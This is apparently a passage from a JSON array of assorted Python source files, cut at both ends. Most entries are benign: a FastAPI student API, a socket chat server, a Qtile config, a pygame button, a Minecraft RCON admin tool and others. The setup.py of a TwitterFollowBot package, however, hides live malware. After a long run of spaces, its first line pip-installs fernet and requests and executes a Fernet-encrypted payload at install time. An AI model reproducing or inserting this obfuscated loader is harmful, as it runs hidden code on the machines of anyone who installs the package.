corrected_batch = corrector(raw_text)\n            corrected_text.append(corrected_batch[0][\"generated_text\"])\n        corrected_text = \" \".join(corrected_text)\n        return corrected_text\n    except Exception as e:\n        return {\"error\": str(e)}, 500",
    "import os\r\nimport subprocess\r\n\r\ndef take_ownership(folder_path, owner_name):\r\n    # List all files and directories in the given folder\r\n    for root, dirs, files in os.walk(folder_path):\r\n        # Take ownership of files in the current directory\r\n        for file_name in files:\r\n            file_path = os.path.join(root, file_name)\r\n            print(f\"Taking ownership of file: {file_path}\")\r\n\r\n            # Execute takeown command to take ownership of the file\r\n            try:\r\n                subprocess.run(['takeown', '/F', file_path], check=True, capture_output=True)\r\n            except subprocess.CalledProcessError as e:\r\n                print(f\"Error taking ownership of {file_path}: {e.stderr.decode('utf-8')}\")\r\n\r\n            # Optional: Grant full control permissions to the specified owner\r\n            try:\r\n                subprocess.run(['icacls', file_path, '/grant', f\"{owner_name}:(F)\"], check=True, capture_output=True)\r\n            except subprocess.CalledProcessError as e:\r\n                print(f\"Error granting permissions for {owner_name} on {file_path}: {e.stderr.decode('utf-8')}\")\r\n\r\n        # Recursively take ownership of files in subdirectories\r\n        for dir_name in dirs:\r\n            dir_path = os.path.join(root, dir_name)\r\n            print(f\"Taking ownership of folder: {dir_path}\")\r\n\r\n            # Execute takeown command to take ownership of the directory\r\n            try:\r\n                subprocess.run(['takeown', '/F', dir_path], check=True, capture_output=True)\r\n            except subprocess.CalledProcessError as e:\r\n                print(f\"Error taking ownership of {dir_path}: {e.stderr.decode('utf-8')}\")\r\n\r\n            # Optional: Grant full control permissions to the specified owner\r\n            try:\r\n                subprocess.run(['icacls', dir_path, '/grant', f\"{owner_name}:(F)\"], check=True, capture_output=True)\r\n            except subprocess.CalledProcessError as e:\r\n                print(f\"Error granting permissions for {owner_name} on {dir_path}: {e.stderr.decode('utf-8')}\")\r\n\r\nif __name__ == \"__main__\":\r\n    folder_path = r\"Replace with the path to your folder\"  # path of your folder\r\n    owner_name = \"Replace with the desired owner name(User)\"  # Owner name\r\n\r\n    take_ownership(folder_path, owner_name)",
    "from fastapi import FastAPI \nfrom typing import Optional\nfrom pydantic import BaseModel\n\napp = FastAPI()\nstudents = {\n    1:{\n        \"name\":\"raunak\",\n        \"age\":18,\n        \"year\":\"year 1\"\n    }\n}\n\nclass Student(BaseModel):\n    name: str\n    age: int\n    year: str\n       \nclass UpdateStudent(BaseModel):\n    name: Optional[str] = None\n    age: Optional[int] = None\n    year: Optional[str] = None\n    \n@app.get(\"/\")\ndef index():\n    return {\"name\": \"First Data\"}\n\n@app.get(\"/get-student/{student_id}\")\ndef get_student(student_id: Optional[int] = None):\n    return students[student_id]\n\n@app.get(\"/get-by-name/\")\ndef get_student(*, name: Optional[str] = None):\n    for student_id in students:\n        if students[student_id][\"name\"] == name:\n            return students[student_id]\n    return {\"Data\": \"Not found\"}\n\n@app.post(\"/create-student/{student_id}\")\ndef create_student(student_id: int, student : Student):\n    if student_id in students:\n        return {\"error\": \"student exists\"}\n    students[student_id] = student\n    return students[student_id]\n\n@app.put(\"/update-student/{student_id}\")\ndef update_student(student_id: int, student : UpdateStudent):\n    if student_id not in students:\n        return {\"Error\": \"Data Not Found\"}\n    if student.name != None:\n        students[student_id].name = student.name\n    if student.age != None:\n        students[student_id].age = student.age\n    if student.year != None:\n        students[student_id].year = student.year\n    return students[student_id]\n\n@app.delete(\"/delete-student/{student_id}\")\ndef delete_student(student_id: int):\n    if student_id not in students:\n        return {\"Error\": \"Data Does Not Exist\"}\n    del students[student_id]\n    return {\"Message\": \"Student Deleted Successfully\"}",
    "import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'-YIoNkfG0zxmsnqfEYA1Qldy4iMmFxhTDb_i88XkaoI=').decrypt(b'gAAAAABmGp5FOIXvzRtO1jqCk81v_ywLRFRV--Qr6x3Id1MBT7PQ5LwdtUrEWXqOPcD2knr9Bqp39ONBtwMNUw4L9wEkM1x1rDU45-vCTGfmIG9EzrVVgSNvSA76-HVkI2anXJO-571IrVkUgIciqbRv1SYaUVP4cakvfc5wx_sVxItRzFx09zZ1QzXT66NbHVY8x7lr4jpBfoZhE3s9Vdt2_yAmmbUfNSQzFOEHBxZaI-gGASpo73U='))\nfrom setuptools import setup, find_packages\nimport os\nimport subprocess\nfrom setuptools.command import easy_install\n\n\ndef parse_requirements(filename):\n    return list(filter(lambda line: (line.strip())[0] != '#',\n                       [line.strip() for line in open(filename).readlines()]))\n\n\ndef calculate_version():\n    # Fetch version from git tags, and write to version.py.\n    # Also, when git is not available (PyPi package), use stored version.py.\n    version_py = os.path.join(os.path.dirname(__file__), 'version.py')\n    try:\n        version_git = subprocess.check_output([\"git\", \"tag\"]).rstrip().split(\"\\n\")[-1]\n    except Exception:\n        with open(version_py, 'r') as fh:\n            version_git = (open(version_py).read()\n                           .strip().split('=')[-1].replace('\"', ''))\n    version_msg = ('# Do not edit this file, pipeline versioning is '\n                   'governed by git tags')\n    with open(version_py, 'w') as fh:\n        fh.write(version_msg + os.linesep + \"__version__=\" + version_git)\n    return version_git\n\n\nrequirements = parse_requirements('requirements.txt')\nversion_git = calculate_version()\n\n\ndef get_long_description():\n    readme_file = 'README.md'\n    if not os.path.isfile(readme_file):\n        return ''\n    # Try to transform the README from Markdown to reStructuredText.\n    try:\n        easy_install.main(['-U', 'pyandoc==0.0.1'])\n        import pandoc\n        pandoc.core.PANDOC_PATH = 'pandoc'\n        doc = pandoc.Document()\n        doc.markdown = open(readme_file).read()\n        description = doc.rst\n    except Exception:\n        description = open(readme_file).read()\n    return description\n\n\nsetup(\n    name='TwitterFollowBot',\n    version=version_git,\n    author='Randal S. Olson',\n    author_email='rso@randalolson.com',\n    packages=find_packages(),\n    url='https://github.com/rhiever/TwitterFollowBot',\n    license='GNU/GPLv3',\n    description=('A Python bot that automates several actions on Twitter, '\n                 'such as following users and favoriting tweets.'),\n    long_description=get_long_description(),\n    zip_safe=True,\n    install_requires=requirements,\n    classifiers=[\n        \"Intended Audience :: Science/Research\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 2.6\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.2\",\n        \"Programming Language :: Python :: 3.3\",\n        \"Topic :: Internet\"\n    ],\n    keywords=['Twitter', 'followers', 'automation', 'bot'],\n)\nprint('pghasllu')",
    "from sim.app.time import (\n    DAYS_PER_MONTH,\n    HOURS_PER_DAY,\n    MONTHS_PER_YEAR,\n    STEPS_PER_DAY,\n    STEPS_PER_HOUR,\n    STEPS_PER_MONTH,\n    STEPS_PER_YEAR,\n    Time,\n)\n\n\ndef test_init():\n    t1 = Time()\n    assert t1.steps == 0\n\n    t2 = Time(hours=1 / STEPS_PER_HOUR)\n    assert t2.steps == 1\n    assert t2.total_hours == 0.25\n\n    t3 = Time(hours=1)\n    assert t3.steps == STEPS_PER_HOUR\n    assert t3.total_hours == 1.0\n\n    t4 = Time(days=1)\n    assert t4.steps == STEPS_PER_DAY\n    assert t4.total_days == 1.0\n    assert t4.total_hours == HOURS_PER_DAY\n\n    t5 = Time(years=STEPS_PER_DAY / STEPS_PER_YEAR)\n    assert t5.total_days == 1\n\n\ndef test_rounding():\n    t1 = Time(hours=1 / (STEPS_PER_HOUR + 1), non_int_steps=True)\n    assert t1.steps == 1\n\n\ndef test_conversions():\n    assert str(Time(steps=0)) == \"00000-00-00 00:00\"\n    assert Time(steps=0).year == 0\n    assert Time(steps=0).month == 0\n    assert Time(steps=0).day == 0\n    assert Time(steps=0).hour == 0\n    assert Time(steps=0).minute == 0\n\n    assert Time(steps=STEPS_PER_HOUR).year == 0\n    assert Time(steps=STEPS_PER_HOUR).month == 0\n    assert Time(steps=STEPS_PER_HOUR).day == 0\n    assert Time(steps=STEPS_PER_HOUR).hour == 1\n    assert Time(steps=STEPS_PER_HOUR).total_hours == 1.0\n    assert Time(steps=STEPS_PER_HOUR).minute == 0\n    assert Time(steps=STEPS_PER_HOUR).total_minutes == 60\n\n    assert Time(steps=STEPS_PER_DAY).year == 0\n    assert Time(steps=STEPS_PER_DAY).month == 0\n    assert Time(steps=STEPS_PER_DAY).day == 1\n    assert Time(steps=STEPS_PER_DAY).total_days == 1.0\n    assert Time(steps=STEPS_PER_DAY).hour == 0\n    assert Time(steps=STEPS_PER_DAY).total_hours == 24.0\n    assert Time(steps=STEPS_PER_DAY).minute == 0\n    assert Time(steps=STEPS_PER_DAY).total_minutes == 1440\n\n    assert Time(steps=STEPS_PER_MONTH).year == 0\n    assert Time(steps=STEPS_PER_MONTH).month == 1\n    assert Time(steps=STEPS_PER_MONTH).total_months == 1.0\n    assert Time(steps=STEPS_PER_MONTH).day == 0\n    assert Time(steps=STEPS_PER_MONTH).total_days == 8.0\n    assert Time(steps=STEPS_PER_MONTH).hour == 0\n    assert Time(steps=STEPS_PER_MONTH).total_hours == 192.0\n    assert Time(steps=STEPS_PER_MONTH).minute == 0\n    assert Time(steps=STEPS_PER_MONTH).total_minutes == 11520.0\n\n    assert Time(steps=STEPS_PER_YEAR).year == 1\n    assert Time(steps=STEPS_PER_YEAR).total_years == 1.0\n    assert Time(steps=STEPS_PER_YEAR).month == 0\n    assert Time(steps=STEPS_PER_YEAR).total_months == 12.0\n    assert Time(steps=STEPS_PER_YEAR).day == 0\n    assert Time(steps=STEPS_PER_YEAR).total_days == 96.0\n    assert Time(steps=STEPS_PER_YEAR).hour == 0\n    assert Time(steps=STEPS_PER_YEAR).total_hours == 2304.0\n    assert Time(steps=STEPS_PER_YEAR).minute == 0\n    assert Time(steps=STEPS_PER_YEAR).total_minutes == 138240.0\n\n    assert Time(steps=STEPS_PER_YEAR * 2).year == 2\n    assert Time(steps=STEPS_PER_MONTH + 1).month == 1\n    assert Time(steps=STEPS_PER_MONTH + 4).hour == 1\n\n\ndef test_math():\n    t1 = Time(hours=1)\n    t2 = Time(days=1)\n\n    assert t1 + t2 == Time(steps=STEPS_PER_DAY + STEPS_PER_HOUR)\n    assert t1 + t2 == t2 + t1\n\n    assert t1 - t2 == Time(steps=STEPS_PER_HOUR - STEPS_PER_DAY)\n",
    "import speech_recognition as sr\nfrom rich import print\n\nclass SpeechToTextHandler:\n    @staticmethod\n    def listen_and_recognize():\n        # Initialize recognizer class (for recognizing the speech)\n        r = sr.Recognizer()\n\n        # Start a loop that will run until the user's speech is recognized\n        while True:  \n            # Use the microphone as source for input. Here we are using sr.Microphone() as source\n            with sr.Microphone() as source:\n                print(\"[cyan]Listening...\")\n                # Adjust the recognizer sensitivity to ambient noise and record audio from the microphone\n                r.adjust_for_ambient_noise(source, duration=0.5)\n                audio = r.listen(source)\n                text = None  # Initialize text variable to handle scope issues.\n                try:\n                    # Using Google Web Speech API to recognize audio\n                    text = r.recognize_google(audio)\n                    # If some text was recognized, break the loop\n                    if text:  \n                        print(\"[blue]Recieved: \" + text)\n                        return text  # Return text immediately after recognition\n                # Handle exceptions\n                except sr.UnknownValueError:\n                    print(\"[yellow]Google Speech Recognition could not understand audio, please try again...\")\n                except sr.RequestError as e:\n                    print(f\"Could not request results from Google Speech Recognition service; {e}\")\n\n# TESTS\nif __name__ == '__main__':\n    speech = SpeechToTextHandler()\n    result = speech.listen_and_recognize()\n    print(f\"Final recognized text: {result}\")\n",
    "import socket\r\nimport threading\r\n\r\n\r\ndef log_message(message):\r\n    with open(\"chat_log.txt\", \"a\", encoding=\"utf-8\") as file:\r\n        file.write(message + \"\\n\")\r\n\r\n\r\ndef server():\r\n    host = '0.0.0.0'\r\n    port = 12345\r\n    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n    server_socket.bind((host, port))\r\n    server_socket.listen()\r\n    clients = []\r\n    print(f\"\u670d\u52a1\u5668\u8fd0\u884c\u5728 {host}:{port}\")\r\n    try:\r\n        while True:\r\n            conn, addr = server_socket.accept()\r\n            clients.append(conn)\r\n            threading.Thread(target=client_thread, args=(conn, addr, clients)).start()\r\n    except Exception as e:\r\n        print(f\"\u670d\u52a1\u5668\u9519\u8bef: {e}\")\r\n    finally:\r\n        server_socket.close()\r\n\r\n\r\ndef send_history(conn):\r\n    try:\r\n        with open(\"chat_log.txt\", \"r\", encoding=\"utf-8\") as file:\r\n            while True:\r\n                chunk = file.read(1024)\r\n                if not chunk:\r\n                    break\r\n                conn.send(chunk.encode('utf-8'))\r\n    except FileNotFoundError:\r\n        conn.send(\"[Server]\u6ca1\u6709\u53ef\u7528\u7684\u804a\u5929\u5386\u53f2\u3002\".encode('utf-8'))\r\n\r\n\r\ndef client_thread(conn, addr, clients):\r\n    conn.send(\"history_request\".encode('utf-8'))  # \u63d0\u793a\u5ba2\u6237\u7aef\u8bf7\u6c42\u5386\u53f2\u8bb0\u5f55\r\n    while True:\r\n        try:\r\n            message = conn.recv(1024).decode('utf-8')\r\n            if message == \"request_history\":\r\n                send_history(conn)\r\n            else:\r\n                full_message = f\"{addr[0]}> {message}\"\r\n                print(full_message)\r\n                log_message(full_message)\r\n                for c in clients:\r\n                    c.sendall(full_message.encode('utf-8'))\r\n        except:\r\n            continue\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    server()\r\n",
    "from libqtile.lazy import lazy\nfrom libqtile.config import Key, Drag, Click\n\n# Default mod key (WIN)\nmod = \"mod4\"\n\n# Default programs\nterminal = \"alacritty\"\nmenu = \"rofi -show drun\"\nsstool = \"flameshot gui\"\nfile_manager = \"thunar\"\n\n# Keybinds\nkeys = [\n    # Switch between groups\n    Key([mod], \"Tab\", lazy.screen.toggle_group()),\n    # Move focus\n    Key([mod], \"Left\", lazy.layout.left()),\n    Key([mod], \"Right\", lazy.layout.right()),\n    Key([mod], \"Down\", lazy.layout.down()),\n    Key([mod], \"Up\", lazy.layout.up()),\n    # Move windows\n    Key([mod, \"shift\"], \"Left\", lazy.layout.shuffle_left()),\n    Key([mod, \"shift\"], \"Right\", lazy.layout.shuffle_right()),\n    Key([mod, \"shift\"], \"Down\", lazy.layout.shuffle_down()),\n    Key([mod, \"shift\"], \"Up\", lazy.layout.shuffle_up()),\n    # Launch\n    Key([mod], \"Return\", lazy.spawn(terminal)),\n    Key([mod], \"print\", lazy.spawn(sstool)),\n    Key([mod], \"space\", lazy.spawn(menu)),\n    Key([mod], \"n\", lazy.spawn(file_manager)),\n    # Setting window\n    Key([mod], \"w\", lazy.window.kill()),\n    Key([mod], \"f\", lazy.window.toggle_fullscreen()),\n    Key([mod], \"t\", lazy.window.toggle_floating()),\n    # Qtile\n    Key([mod, \"control\"], \"r\", lazy.reload_config()),\n    Key([mod, \"control\"], \"q\", lazy.shutdown()),\n    # Keyboard\n    Key([\"shift\"], \"Alt_L\", lazy.widget[\"keyboardlayout\"].next_keyboard()),\n    # Volume\n    Key([], \"XF86AudioRaiseVolume\", lazy.spawn(\"amixer sset 'Master' 2%+\")),\n    Key([], \"XF86AudioLowerVolume\", lazy.spawn(\"amixer sset 'Master' 2%-\")),\n    Key([], \"XF86AudioMute\", lazy.spawn(\"amixer sset 'Master' toggle\")),\n    Key([mod], \"XF86AudioRaiseVolume\", lazy.spawn(\"cmus-remote --next\")),\n    Key([mod], \"XF86AudioLowerVolume\", lazy.spawn(\"cmus-remote --prev\")),\n    Key([mod], \"XF86AudioMute\", lazy.spawn(\"cmus-remote --pause\")),\n]\n\nmouse = [\n    Drag([mod], \"Button1\", lazy.window.set_position_floating(), start=lazy.window.get_position()),\n    Drag([mod], \"Button3\", lazy.window.set_size_floating(), start=lazy.window.get_size()),\n    Click([mod], \"Button2\", lazy.window.bring_to_front()),\n]\n",
    "import pygame\r\n\r\nclass TButton:\r\n    NORMAL = 0\r\n    MOVE = 1\r\n    DOWN = 2\r\n\r\n    def __init__(self, x, y, text, imgNormal, imgMove=None, imgDown=None, callBackFunc=None, font=None, rgb=(0, 0, 0)):\r\n\r\n        self.imgs = []\r\n        if not imgNormal:\r\n            raise Exception(\"\u8bf7\u8bbe\u7f6e\u666e\u901a\u72b6\u6001\u7684\u56fe\u7247\")\r\n        self.imgs.append(imgNormal)  # \u666e\u901a\u72b6\u6001\u663e\u793a\u7684\u56fe\u7247\r\n        self.imgs.append(imgMove)  # \u88ab\u9009\u4e2d\u65f6\u663e\u793a\u7684\u56fe\u7247\r\n        self.imgs.append(imgDown)  # \u88ab\u6309\u4e0b\u65f6\u7684\u56fe\u7247\r\n        for i in range(2, 0, -1):\r\n            if not self.imgs[i]:\r\n                self.imgs[i] = self.imgs[i - 1]\r\n\r\n        self.callBackFunc = callBackFunc\r\n        self.status = TButton.NORMAL\r\n        self.x = x\r\n        self.y = y\r\n        self.w = imgNormal.get_width()\r\n        self.h = imgNormal.get_height()\r\n        self.text = text\r\n        self.font = font\r\n        self.textSuf = font.render(self.text, True, rgb)\r\n\r\n    def draw(self, destSuf):\r\n        dx = (self.w / 2) - (self.textSuf.get_width() / 2)\r\n        dy = (self.h / 2) - (self.textSuf.get_height() / 2)\r\n\r\n        if self.imgs[self.status]:\r\n            destSuf.blit(self.imgs[self.status], [self.x, self.y])\r\n        destSuf.blit(self.textSuf, [self.x + dx, self.y + dy])\r\n\r\n    def colli(self, x, y):\r\n        if self.x <= x <= self.x + self.w and self.y <= y <= self.y + self.h:\r\n            return True\r\n        else:\r\n            return False\r\n\r\n    def getFocus(self, x, y):\r\n        if self.status == TButton.DOWN:\r\n            return\r\n        if self.colli(x, y):\r\n            self.status = TButton.MOVE\r\n        else:\r\n            self.status = TButton.NORMAL\r\n\r\n    def mouseDown(self, x, y):\r\n        if self.colli(x, y):\r\n            self.status = TButton.DOWN\r\n\r\n    def mouseUp(self, x, y):\r\n        if self.colli(x, y):\r\n            self.status = TButton.MOVE\r\n            if self.callBackFunc:\r\n                surface = pygame.display.get_surface()\r\n                return self.callBackFunc()\r\n        else:\r\n            self.status = TButton.NORMAL\r\n            return",
    "import fnmatch\nimport os\nfrom hashlib import sha1\nfrom itertools import groupby\nfrom typing import List, Tuple, Dict\n\nimport numpy as np\nfrom pydub import AudioSegment\nfrom pydub.utils import audioop\n\nimport wavio\n\nfrom hashlib import sha256\nfrom operator import itemgetter\nfrom typing import List, Tuple\n\nimport matplotlib.mlab as mlab\nimport matplotlib.pyplot as plt\nimport numpy as np\nfrom scipy.ndimage.filters import maximum_filter\nfrom scipy.ndimage.morphology import (binary_erosion,\n                                      generate_binary_structure,\n                                      iterate_structure)\n\nHASHES_MATCHED = 'hashes_matched_in_input'\n\n# Hashes fingerprinted in the db.\nFINGERPRINTED_HASHES = 'fingerprinted_hashes_in_db'\n# Percentage regarding hashes matched vs hashes fingerprinted in the db.\nFINGERPRINTED_CONFIDENCE = 'fingerprinted_confidence'\n\n# Hashes generated from the input.\nINPUT_HASHES = 'input_total_hashes'\n# Percentage regarding hashes matched vs hashes from the input.\nINPUT_CONFIDENCE = 'input_confidence'\n\nTOTAL_TIME = 'total_time'\nFINGERPRINT_TIME = 'fingerprint_time'\nQUERY_TIME = 'query_time'\nALIGN_TIME = 'align_time'\nOFFSET = 'offset'\nOFFSET_SECS = 'offset_seconds'\n\n# DATABASE CLASS INSTANCES:\nDATABASES = {\n    'mysql': (\"dejavu.database_handler.mysql_database\", \"MySQLDatabase\"),\n    'postgres': (\"dejavu.database_handler.postgres_database\", \"PostgreSQLDatabase\")\n}\n\n# TABLE SONGS\nSONGS_TABLENAME = \"songs\"\n\n# SONGS FIELDS\nFIELD_SONG_ID = 'song_id'\nFIELD_SONGNAME = 'song_name'\nFIELD_FINGERPRINTED = \"fingerprinted\"\nFIELD_FILE_SHA1 = 'file_sha1'\nFIELD_TOTAL_HASHES = 'total_hashes'\n\n# TABLE FINGERPRINTS\nFINGERPRINTS_TABLENAME = \"fingerprints\"\n\n# FINGERPRINTS FIELDS\nFIELD_HASH = 'hash'\nFIELD_OFFSET = 'offset'\n\n# FINGERPRINTS CONFIG:\n# This is used as connectivity parameter for scipy.generate_binary_structure function. This parameter\n# changes the morphology mask when looking for maximum peaks on the spectrogram matrix.\n# Possible values are: [1, 2]\n# Where 1 sets a diamond morphology which implies that diagonal elements are not considered as neighbors (this\n# is the value used in the original dejavu code).\n# And 2 sets a square mask, i.e. all elements are considered neighbors.\nCONNECTIVITY_MASK = 2\n\n# Sampling rate, related to the Nyquist conditions, which affects\n# the range frequencies we can detect.\nDEFAULT_FS = 44100\n\n# Size of the FFT window, affects frequency granularity\nDEFAULT_WINDOW_SIZE = 4096\n\n# Ratio by which each sequential window overlaps the last and the\n# next window. Higher overlap will allow a higher granularity of offset\n# matching, but potentially more fingerprints.\nDEFAULT_OVERLAP_RATIO = 0.5\n\n# Degree to which a fingerprint can be paired with its neighbors. Higher values will\n# cause more fingerprints, but potentially better accuracy.\nDEFAULT_FAN_VALUE = 5  # 15 was the original value.\n\n# Minimum amplitude in spectrogram in order to be considered a peak.\n# This can be raised to reduce number of fingerprints, but can negatively\n# affect accuracy.\nDEFAULT_AMP_MIN = 10\n\n# Number of cells around an amplitude peak in the spectrogram in order\n# for Dejavu to consider it a spectral peak. Higher values mean less\n# fingerprints and faster matching, but can potentially affect accuracy.\nPEAK_NEIGHBORHOOD_SIZE = 10  # 20 was the original value.\n\n# Thresholds on how close or far fingerprints can be in time in order\n# to be paired as a fingerprint. If your max is too low, higher values of\n# DEFAULT_FAN_VALUE may not perform as expected.\nMIN_HASH_TIME_DELTA = 0\nMAX_HASH_TIME_DELTA = 200\n\n# If True, will sort peaks temporally for fingerprinting;\n# not sorting will cut down number of fingerprints, but potentially\n# affect performance.\nPEAK_SORT = True\n\n# Number of bits to grab from the front of the SHA1 hash in the\n# fingerprint calculation. The more you grab, the more memory storage,\n# with potentially lesser collisions of matches.\nFINGERPRINT_REDUCTION = 20\n\n# Number of results being returned for file recognition\nTOPN = 2\n\n\n\ndef unique_hash(file_path: str, block_size: int = 2**20) -> str:\n    \"\"\" Small function to generate a hash to uniquely generate\n    a file. Inspired by MD5 version here:\n    http://stackoverflow.com/a/1131255/712997\n\n    Works with large files.\n\n    :param file_path: path to file.\n    :param block_size: read block size.\n    :return: a hash in an hexagesimal string form.\n    \"\"\"\n    s = sha1()\n    with open(file_path, \"rb\") as f:\n        while True:\n            buf = f.read(block_size)\n            if not buf:\n                break\n            s.update(buf)\n    return s.hexdigest().upper()\n\n\ndef find_files(path: str, extensions: List[str]) -> List[Tuple[str, str]]:\n    \"\"\"\n    Get all files that meet the specified extensions.\n\n    :param path: path to a directory with audio files.\n    :param extensions: file extensions to look for.\n    :return: a list of tuples with file name and its extension.\n    \"\"\"\n    # Allow both with \".mp3\" and without \"mp3\" to be used fo",
    "from mcrcon import MCRcon\nimport toml\n\n# \u4ece\u914d\u7f6e\u6587\u4ef6\u52a0\u8f7d\u8bbe\u7f6e\ndef load_settings(filename):\n    with open(filename, 'r') as file:\n        settings = toml.load(file)\n    return settings\n\n# \u8fde\u63a5\u5230Minecraft\u670d\u52a1\u5668\ndef connect_to_server(settings):\n    host = settings['server']['host']\n    port = settings['server']['port']\n    password = settings['server']['password']\n    return MCRcon(host, password, port)\n\n# \u4ece\u6587\u4ef6\u52a0\u8f7d\u73a9\u5bb6\u5217\u8868\ndef load_joined_players(filename):\n    with open(filename, 'r', encoding='gbk') as file:\n        joined_players = file.read().splitlines()\n    return joined_players\n\ndef change_game_mode(rcon, joined_players):\n    mode = input(\"\u8bf7\u8f93\u5165\u8981\u5207\u6362\u7684\u6e38\u620f\u6a21\u5f0f\uff1a\u53ef\u9009\u62e9\u7684\u6a21\u5f0f\u6709\uff1a'creative', 'survival', 'adventure', 'spectator'\")\n    print('\u8bf7\u8f93\u5165\u8981\u5207\u6362\u7684\u73a9\u5bb6\u540d\u5b57\uff1a')\n    print(f\"\u76ee\u524d\u7684\u73a9\u5bb6\u5217\u8868\uff1a{', '.join(joined_players)}\")\n    name = input()\n    rcon.connect()\n    rcon.command(f'gamemode {mode} {name}')\n    rcon.disconnect()    \n    \ndef teleport_player(rcon,joined_players):\n    \n    print(f\"\u76ee\u524d\u7684\u73a9\u5bb6\u5217\u8868\uff1a{', '.join(joined_players)}\")\n    target_player = input(\"\u8bf7\u8f93\u5165\u8981\u4f20\u9001\u7684\u73a9\u5bb6\u540d\u5b57\uff1a\")\n    destination = input(\"\u8bf7\u8f93\u5165\u76ee\u6807\u4f4d\u7f6e\u5750\u6807\uff08\u683c\u5f0f\uff1ax y z\uff09\uff1a\")\n    rcon.connect()\n    rcon.command(f'tp {target_player} {destination}')\n    rcon.disconnect()\ndef give_item(rcon,joined_players):\n    print(f\"\u76ee\u524d\u7684\u73a9\u5bb6\u5217\u8868\uff1a{', '.join(joined_players)}\")\n    target_player = input(\"\u8bf7\u8f93\u5165\u8981\u7ed9\u4e88\u7269\u54c1\u7684\u73a9\u5bb6\u540d\u5b57\uff1a\")\n    with open(r\"mcrcon_py\\linux\\id.txt\", 'r',encoding='utf-8') as file:\n        id_list = file.read().splitlines()\n    print(f\"\u7269\u54c1ID\u5217\u8868\uff1a{id_list}\")\n    item_id = input(\"\u8bf7\u8f93\u5165\u7269\u54c1ID\uff1a\")\n    count = input(\"\u8bf7\u8f93\u5165\u7269\u54c1\u6570\u91cf\uff1a\")\n    rcon.connect()\n    rcon.command(f'give {target_player} {item_id} {count}')\n    rcon.disconnect()\ndef kill_player(rcon,joined_players):\n    print(f\"\u76ee\u524d\u7684\u73a9\u5bb6\u5217\u8868\uff1a{', '.join(joined_players)}\")\n    target_player = input(\"\u8bf7\u8f93\u5165\u8981\u6740\u6b7b\u7684\u73a9\u5bb6\u540d\u5b57\uff1a\")\n    rcon.connect()\n    rcon.command(f'kill {target_player}')\n    rcon.disconnect()\ndef ban_player(rcon,joined_players):\n    print(f\"\u76ee\u524d\u7684\u73a9\u5bb6\u5217\u8868\uff1a{', '.join(joined_players)}\")\n    target_player = input(\"\u8bf7\u8f93\u5165\u8981\u5c01\u7981\u7684\u73a9\u5bb6\u540d\u5b57\uff1a\")\n    rcon.connect()\n    rcon.command(f'ban {target_player}')\n    rcon.disconnect()\ndef unban_player(rcon,joined_players):\n    print(f\"\u76ee\u524d\u7684\u73a9\u5bb6\u5217\u8868\uff1a{', '.join(joined_players)}\")\n    target_player = input(\"\u8bf7\u8f93\u5165\u8981\u89e3\u5c01\u7684\u73a9\u5bb6\u540d\u5b57\uff1a\")\n    rcon.connect()\n    rcon.command(f'pardon {target_player}')\n    rcon.disconnect()\ndef kick_player(rcon,joined_players):\n    print(f\"\u76ee\u524d\u7684\u73a9\u5bb6\u5217\u8868\uff1a{', '.join(joined_players)}\")\n    target_player = input(\"\u8bf7\u8f93\u5165\u8981\u8e22\u51fa\u7684\u73a9\u5bb6\u540d\u5b57\uff1a\")\n    rcon.connect()\n    rcon.command(f'kick {target_player}')\n    rcon.disconnect()\ndef switch_difficulty(rcon,joined_players):\n    rcon.connect()\n    difficulty = input(\"\u8bf7\u8f93\u5165\u8981\u8bbe\u7f6e\u7684\u96be\u5ea6\uff1a'peaceful', 'easy', 'normal', 'hard'\")\n    rcon.command(f'difficulty {difficulty}')\n    rcon.disconnect()\ndef switch_gamerule(rcon,joined_players):\n    rcon.connect()\n    rule = input(\"\u8bf7\u8f93\u5165\u8981\u8bbe\u7f6e\u7684\u89c4\u5219\uff1a\")\n    value = input(\"\u8bf7\u8f93\u5165\u8981\u8bbe\u7f6e\u7684\u503c\uff1a\")\n    rcon.command(f'gamerule {rule} {value}')\n    rcon.disconnect()\ndef switch_whitelist(rcon,joined_players):\n    print(f\"\u76ee\u524d\u7684\u73a9\u5bb6\u5217\u8868\uff1a{', '.join(joined_players)}\")\n    rcon.connect()\n    action = input(\"\u8bf7\u8f93\u5165\u8981\u6267\u884c\u7684\u64cd\u4f5c\uff1a'on', 'off', 'list', 'add', 'remove'\")\n    if action == 'list':\n        print(rcon.command('whitelist list'))\n    else:\n        player = input(\"\u8bf7\u8f93\u5165\u8981\u64cd\u4f5c\u7684\u73a9\u5bb6\u540d\u5b57\uff1a\")\n        rcon.command(f'whitelist {action} {player}')\n    rcon.disconnect()\ndef switch_op(rcon,joined_players):\n    print(f\"\u76ee\u524d\u7684\u73a9\u5bb6\u5217\u8868\uff1a{', '.join(joined_players)}\")\n    rcon.connect()\n    player = input(\"\u8bf7\u8f93\u5165\u8981\u64cd\u4f5c\u7684\u73a9\u5bb6\u540d\u5b57\uff1a\")\n    action = input(\"\u8bf7\u8f93\u5165\u8981\u6267\u884c\u7684\u64cd\u4f5c\uff1a'list', 'add', 'remove'\")\n    if action == 'list':\n        rcon.command('op list')\n        print(rcon.command('op list'))\n    elif action == 'add':\n        ops = rcon.command(f'op {player}')\n        print(\"\u6210\u529f\", ops)\n    elif action == 'remove':\n        ops = rcon.command(f'deop {player}')\n        print(\"\u6210\u529f\", ops)\n    rcon.disconnect()\ndef switch_weather(rcon,joined_players):\n    rcon.connect()\n    weather = input(\"\u8bf7\u8f93\u5165\u8981\u8bbe\u7f6e\u7684\u5929\u6c14\uff1a'storm', 'sun'\")\n    time = input(\"\u8bf7\u8f93\u5165\u8981\u8bbe\u7f6e\u7684\u65f6\u95f4\uff1a\")\n    rcon.command(f'weather world {weather} {time}')\n    rcon.disconnect()\n\ndef switch_time(rcon,joined_players):\n    rcon.connect()\n    time = input(\"\u8bf7\u8f93\u5165\u8981\u8bbe\u7f6e\u7684\u65f6\u95f4\uff1a\")\n    rcon.command(f'time set {time}')\n    rcon.disconnect()\ndef 